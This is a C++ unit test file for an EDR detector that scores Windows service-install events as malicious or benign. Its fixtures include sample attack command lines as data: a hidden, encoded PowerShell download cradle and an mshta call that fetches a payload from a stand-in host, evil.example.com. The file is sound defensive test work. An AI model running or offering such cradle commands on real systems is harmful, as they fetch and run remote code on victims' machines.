#include "service_install_detector_tests.h"

#include <cstdint>
#include <cstdio>
#include <stdexcept>
#include <string>

#include "edr_event.h"
#include "event_bus.h"
#include "service_install_detector.h"

namespace {

#define SVC_CHECK(cond) Check((cond), #cond, __LINE__)

void Check(bool cond, const char* expr, int line) {
    if (!cond) {
        throw std::runtime_error(
            "service install detector test failed at line " +
            std::to_string(line) + ": " + expr);
    }
}

edr::Event ServiceInstall(const std::string& name,
                          const std::string& imagePath,
                          const std::string& startType = "2") {
    edr::Event ev;
    ev.type = EDR_EVT_SERVICE_INSTALL;
    ev.pid = 0;
    ev.ts100ns = 1000000000ULL;
    ev.fields[edr::field::kType] = "SERVICE_INSTALL";
    ev.fields[edr::field::kServiceName] = name;
    ev.fields[edr::field::kServiceImagePath] = imagePath;
    ev.fields[edr::field::kServiceStartType] = startType;
    return ev;
}

std::string Field(const edr::Event& ev, const char* name) {
    auto found = ev.fields.find(name);
    return found == ev.fields.end() ? std::string() : found->second;
}

/* Encoded PowerShell cradle from a temp dir, auto start:
 * transient(30) + lolbin(25) + encoded(25) + web(15) + auto(5) = 100
 * -> MALICIOUS. */
void TestEncodedCradleMalicious() {
    edr::ServiceInstallDetector detector(true);
    edr::Event ev = ServiceInstall(
        "WindowsUpdater",
        "C:\\Users\\bob\\AppData\\Local\\Temp\\powershell.exe -nop -w "
        "hidden -enc SQBFAFgA http://evil.example.com/a");
    detector.Enrich(ev);
    SVC_CHECK(Field(ev, edr::field::kSvcInstallVerdict) == "MALICIOUS");
    SVC_CHECK(Field(ev, edr::field::kSvcInstallScore) == "100");
    const std::string signals = Field(ev, edr::field::kSvcInstallSignals);
    SVC_CHECK(signals.find("encoded_or_cradle") != std::string::npos);
    SVC_CHECK(signals.find("transient_dir") != std::string::npos);
}

/* LOLBin in transient dir with web payload:
 * transient(30) + lolbin(25) + web(15) + auto(5) = 75 -> MALICIOUS. */
void TestLolbinTempDirMalicious() {
    edr::ServiceInstallDetector detector(true);
    edr::Event ev = ServiceInstall(
        "SvcHelper",
        "C:\\Users\\bob\\AppData\\Local\\Temp\\mshta.exe "
        "http://evil.example.com/payload.hta");
    detector.Enrich(ev);
    SVC_CHECK(Field(ev, edr::field::kSvcInstallVerdict) == "MALICIOUS");
    SVC_CHECK(Field(ev, edr::field::kSvcInstallSignals)
                  .find("transient_dir") != std::string::npos);
    SVC_CHECK(Field(ev, edr::field::kSvcInstallSignals)
                  .find("lolbin_image") != std::string::npos);
}

/* UNC-hosted binary: unc_path(15)+... only 20 -> no verdict. */
void TestUncPathLowScore() {
    edr::ServiceInstallDetector detector(true);
    edr::Event ev = ServiceInstall(
        "Legitish",
        "\\\\fileserver\\share\\tools\\worker.exe", "auto");
    detector.Enrich(ev);
    /* unc(15) + auto(5) = 20 -> below threshold. */
    SVC_CHECK(Field(ev, edr::field::kSvcInstallVerdict).empty());
    SVC_CHECK(Field(ev, edr::field::kSvcInstallScore) == "20");
}

/* Normal system service binary is not flagged at all. */
void TestBenignServiceNotFlagged() {
    edr::ServiceInstallDetector detector(true);
    edr::Event ev = ServiceInstall(
        "W64Time",
        "C:\\Windows\\System32\\svchost.exe -k LocalService -n", "2");
    detector.Enrich(ev);
    SVC_CHECK(Field(ev, edr::field::kSvcInstallScore).empty());
    SVC_CHECK(Field(ev, edr::field::kSvcInstallVerdict).empty());
}

/* Disabled detector never enriches. */
void TestDisabledDetector() {
    edr::ServiceInstallDetector detector(false);
    edr::Event ev = ServiceInstall(
        "Bad", "C:\\Temp\\implant.exe");
    detector.Enrich(ev);
    SVC_CHECK(Field(ev, edr::field::kSvcInstallScore).empty());
}

/* Inspects only service install events. */
void TestInspects() {
    SVC_CHECK(edr::ServiceInstallDetector::Inspects(EDR_EVT_SERVICE_INSTALL));
    SVC_CHECK(!edr::ServiceInstallDetector::Inspects(EDR_EVT_PROCESS_START));
}

} // namespace

void RunServiceInstallDetectorTests() {
    TestEncodedCradleMalicious();
    TestLolbinTempDirMalicious();
    TestUncPathLowScore();
    TestBenignServiceNotFlagged();
    TestDisabledDetector();
    TestInspects();
}
